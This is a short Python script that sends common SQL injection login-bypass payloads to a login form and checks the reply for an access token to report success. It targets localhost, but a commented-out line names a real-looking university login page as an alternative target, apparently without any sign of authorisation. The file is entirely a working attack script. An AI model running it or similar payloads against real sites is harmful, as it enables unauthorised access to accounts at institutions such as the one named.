import requests

target_url = "http://localhost:1111/auth/login"
# target_url = "https://stikomelrahma.ac.id/login"

sql_payloads = ["' OR 1=1 --", "admin'--", "' OR 'x'='x"]

for payload in sql_payloads:
    data = {
        "username": payload,
        "password": "123",  
    }

    response = requests.post(target_url, data=data)

    # print(response.text)
    if "accessToken" in response.text:
        print(f"SQL Injection logged use : {payload}")
    else:
        print("Sql injection no detected, try again with others payloads")
